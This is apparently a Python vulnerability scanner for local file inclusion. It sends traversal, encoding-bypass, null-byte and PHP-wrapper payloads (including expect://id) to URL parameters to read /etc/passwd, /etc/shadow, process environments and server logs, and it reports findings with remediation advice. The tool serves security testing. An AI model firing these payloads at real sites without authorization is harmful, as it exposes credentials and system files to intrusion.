"""
LFI Scanner - Production Grade
Techniques: Path traversal, Null byte injection, URL encoding bypass,
PHP wrappers, Log poisoning indicators, Baseline diff comparison
"""
import requests, time, re, difflib
from urllib.parse import urlparse, parse_qs

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
}

FILE_PARAM_KEYWORDS = {
    "file","page","path","include","inc","doc","document","template",
    "view","load","read","content","module","section","lang","language",
    "layout","config","conf","ini","log","dir","folder","src","source",
    "require","import","display","show","get","fetch","open","cat",
}

# (payload, type, verification_patterns)
LFI_TESTS = [
    # Linux passwd traversal
    ("../../../etc/passwd",                  "linux_3",   [r"root:x:\d+:\d+:", r"daemon:x:\d+:"]),
    ("../../../../etc/passwd",               "linux_4",   [r"root:x:\d+:\d+:", r"www-data:x:"]),
    ("../../../../../etc/passwd",            "linux_5",   [r"root:x:\d+:\d+:"]),
    ("../../../../../../etc/passwd",         "linux_6",   [r"root:x:\d+:\d+:"]),
    # URL encoded
    ("..%2F..%2F..%2Fetc%2Fpasswd",         "url_enc",   [r"root:x:\d+:\d+:"]),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","double_enc",[r"root:x:\d+:\d+:"]),
    # Double dot bypass
    ("....//....//....//etc/passwd",         "double_dot",[r"root:x:\d+:\d+:"]),
    ("..././..././..././etc/passwd",         "dot_slash",  [r"root:x:\d+:\d+:"]),
    # Null byte (older PHP)
    ("../../../etc/passwd\x00",              "null_byte", [r"root:x:\d+:\d+:"]),
    ("../../../etc/passwd%00",              "null_pct",   [r"root:x:\d+:\d+:"]),
    # Absolute paths
    ("/etc/passwd",                          "absolute",  [r"root:x:\d+:\d+:"]),
    ("/etc/hosts",                           "hosts",     [r"127\.0\.0\.1\s+localhost", r"::1"]),
    ("/etc/shadow",                          "shadow",    [r"root:\$", r"daemon:\*", r"invalid password"]),
    ("/proc/self/environ",                   "environ",   [r"PATH=", r"HOME=/", r"PWD=", r"USER="]),
    ("/proc/self/cmdline",                   "cmdline",   [r"python", r"php", r"apache", r"nginx"]),
    # Windows paths
    ("C:\\Windows\\System32\\drivers\\etc\\hosts", "win_hosts", [r"127\.0\.0\.1", r"localhost"]),
    ("../../../../Windows/win.ini",          "win_ini",   [r"\[fonts\]", r"\[extensions\]", r"for 16-bit"]),
    ("C:\\Windows\\win.ini",                 "win_ini2",  [r"\[fonts\]", r"\[extensions\]"]),
    # PHP wrappers
    ("php://filter/convert.base64-encode/resource=index.php",  "php_b64",  [r"PD9waHA", r"PD8k", r"77u/"]),
    ("php://filter/read=string.rot13/resource=index.php",       "php_rot",  [r"<?cuc", r"ercbeg"]),
    ("php://input",                          "php_input", []),
    ("expect://id",                          "expect",    [r"uid=\d+", r"www-data"]),
    ("data://text/plain;base64,dGVzdA==",   "data_uri",  [r"test"]),
    # Log files
    ("../../../var/log/apache2/access.log", "apache_log",[r"GET /", r"HTTP/1\.", r"Mozilla"]),
    ("../../../var/log/nginx/access.log",   "nginx_log", [r"GET /", r"HTTP/1\.", r"Mozilla"]),
]

def check_lfi_response(text, baseline_text, patterns):
    """Verify LFI by checking patterns against response diff."""
    if text == baseline_text:
        return False, None

    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE | re.MULTILINE)
        if match:
            # Make sure it's not in baseline
            if not re.search(pattern, baseline_text, re.IGNORECASE):
                return True, f"File content confirmed: '{match.group(0)[:50]}'"

    return False, None

def is_file_param(name):
    name_l = name.lower()
    return name_l in FILE_PARAM_KEYWORDS or any(k in name_l for k in FILE_PARAM_KEYWORDS)

def run_lfi_scan(crawl_data, timeout=8):
    findings, seen = [], set()

    for page in crawl_data:
        parsed = urlparse(page["url"])
        qs = {k: v[0] for k,v in parse_qs(parsed.query).items()}
        file_params = [k for k in qs if is_file_param(k)]
        if not file_params: continue

        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        base_qs  = {k: v[0] for k,v in qs.items()}

        # Get baseline
        try:
            r0 = requests.get(base_url, params=base_qs, headers=HEADERS,
                             timeout=timeout, verify=False)
            baseline_text = r0.text
        except:
            continue

        for param in file_params[:4]:
            key = f"{base_url}:{param}"
            if key in seen: continue

            for payload, ptype, patterns in LFI_TESTS:
                test_qs = base_qs.copy()
                test_qs[param] = payload
                try:
                    r = requests.get(base_url, params=test_qs, headers=HEADERS,
                                    timeout=timeout, verify=False)

                    # Skip if identical to baseline
                    if r.text == baseline_text: continue

                    # Skip if much shorter (might be error page)
                    if len(r.text) < 50: continue

                    vuln, evidence = check_lfi_response(r.text, baseline_text, patterns)

                    if not vuln and patterns:
                        time.sleep(0.05)
                        continue

                    if not vuln:
                        # No patterns to verify (php://input, expect://)
                        # Check if response changed significantly
                        sim = difflib.SequenceMatcher(None,
                              baseline_text[:2000], r.text[:2000]).ratio()
                        if sim > 0.7:
                            time.sleep(0.05)
                            continue
                        evidence = f"Response significantly changed (similarity: {sim:.2f})"

                    os_type = "Linux" if "linux" in ptype or "etc" in payload.lower() else \
                              "Windows" if "win" in ptype or "windows" in payload.lower() else "Unknown"

                    findings.append({
                        "vuln_type": f"Local File Inclusion (LFI)",
                        "url": page["url"], "parameter": param,
                        "payload": payload, "severity": "Critical",
                        "description": (
                            f"LFI confirmed in param '{param}'. OS: {os_type}. "
                            f"Technique: {ptype.replace('_',' ')}. {evidence}. "
                            f"Attacker can read any file the web server has access to."
                        ),
                        "recommendation": (
                            "1. Never use user input to construct file paths. "
                            "2. Whitelist allowed pages/files (not blacklist). "
                            "3. Use basename() to strip directory traversal. "
                            "4. Disable PHP wrappers in php.ini (allow_url_fopen=Off). "
                            "5. Run web server with minimal filesystem permissions."
                        )
                    })
                    seen.add(key)
                    break

                except: pass
                time.sleep(0.05)

    return findings
